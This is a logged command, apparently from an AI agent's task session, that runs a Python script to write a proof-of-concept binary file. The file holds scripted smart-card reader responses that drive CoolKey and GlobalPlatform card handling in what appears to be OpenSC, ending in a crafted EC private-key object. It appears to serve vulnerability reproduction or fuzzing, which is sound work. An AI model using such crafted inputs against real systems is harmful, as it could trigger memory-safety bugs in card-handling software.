Running command: python3 << 'EOF'
import struct

def chunk(data):
    """Create a chunk: 2-byte LE length + data"""
    return struct.pack('<H', len(data)) + data

def apdu_response(data=b'', sw1=0x90, sw2=0x00):
    """Create APDU response data (data + SW1 + SW2)"""
    return data + bytes([sw1, sw2])

chunks = []

# Chunk 1: ATR (reader connect)
# A simple valid-looking ATR
atr = bytes([0x3B, 0x80, 0x80, 0x01, 0x01])
chunks.append(chunk(atr))

# Chunk 2: SELECT applet (coolkey_match_card -> coolkey_select_applet)
# Just needs SW 90 00
chunks.append(chunk(apdu_response(b'', 0x90, 0x00)))

# Chunk 3: GET_STATUS P1=1 (coolkey_match_card)
# Needs SW 6D 00 to identify as coolkey (not muscle)
chunks.append(chunk(apdu_response(b'', 0x6D, 0x00)))

# Chunk 4: GET_LIFE_CYCLE (coolkey_initialize -> coolkey_get_life_cycle)
# First try: needs sizeof(coolkey_life_cycle_t) = 4 bytes
# life_cycle_t: {life_cycle, pin_count, protocol_version_major, protocol_version_minor}
life_cycle = bytes([0x01, 0x01, 0x01, 0x01])
chunks.append(chunk(apdu_response(life_cycle, 0x90, 0x00)))

# Chunk 5: SELECT applet (coolkey_initialize -> coolkey_select_applet)
chunks.append(chunk(apdu_response(b'', 0x90, 0x00)))

# Chunk 6: LIST_OBJECTS RESET (coolkey_initialize)
# Returns coolkey_object_info_t (14 bytes):
#   object_id[4] + object_length[4] + read_acl[2] + write_acl[2] + delete_acl[2]
# Object ID: 0x6b000001 (key object with 'k' prefix)
# Object length: 20 bytes (our V1 object size)
object_info = bytes([
    0x6b, 0x00, 0x00, 0x01,  # object_id
    0x00, 0x00, 0x00, 0x14,  # object_length = 20
    0x00, 0x00,              # read_acl
    0x00, 0x00,              # write_acl
    0x00, 0x00,              # delete_acl
])
chunks.append(chunk(apdu_response(object_info, 0x90, 0x00)))

# Chunk 7: LIST_OBJECTS NEXT (coolkey_initialize)
# Return FILE_END_REACHED: SW 9C 12
chunks.append(chunk(apdu_response(b'', 0x9C, 0x12)))

# Chunk 8: SELECT card manager (gp_select_card_manager)
# CASE_3_SHORT = no response expected, just SW 90 00
chunks.append(chunk(apdu_response(b'', 0x90, 0x00)))

# Chunk 9: GET DATA CPLC (gp_get_cplc_data)
# Needs 45 bytes of CPLC data + SW 90 00
cplc_data = bytes(45)  # all zeros is fine
chunks.append(chunk(apdu_response(cplc_data, 0x90, 0x00)))

# At this point, coolkey_initialize succeeds and card is ready.
# sc_pkcs15_bind will call sc_pkcs15emu_coolkey_init_ex

# Chunk 10: READ_OBJECT (coolkey_fill_object - reads our key object)
# The V1 object data (20 bytes):
# record_type(1) + object_id(4) + fixed_attributes(4) + attribute_count(2) + attribute(9)
#
# Fixed attributes: CKA_CLASS=3 (private key), CKA_ID=1
# Native value: (1 & 0xf) | (3 << 4) = 0x31
# As big-endian 4 bytes: 00 00 00 31
#
# Attribute: CKA_KEY_TYPE (0x00000100) = INTEGER type, value CKK_EC (3)

v1_object = bytes([
    0x01,                    # record_type = COOLKEY_V1_OBJECT
    0x6b, 0x00, 0x00, 0x01,  # object_id
    0x00, 0x00, 0x00, 0x31,  # fixed_attributes_values (class=3/PRKEY, id=1)
    0x00, 0x01,              # attribute_count = 1
    # Attribute: CKA_KEY_TYPE
    0x00, 0x00, 0x01, 0x00,  # attribute_attr_type = CKA_KEY_TYPE
    0x01,                    # attribute_data_type = COOLKEY_ATTR_TYPE_INTEGER
    0x00, 0x00, 0x00, 0x03,  # value = CKK_EC (3)
])
assert len(v1_object) == 20
chunks.append(chunk(apdu_response(v1_object, 0x90, 0x00)))

# Combine all chunks
poc_data = b''.join(chunks)

with open('/workspace/poc', 'wb') as f:
    f.write(poc_data)

print(f"PoC written: {len(poc_data)} bytes, {len(chunks)} chunks")
for i, c in enumerate(chunks):
    clen = struct.unpack('<H', c[:2])[0]
    print(f"  Chunk {i+1}: length={clen}, total={len(c)}")
EOF
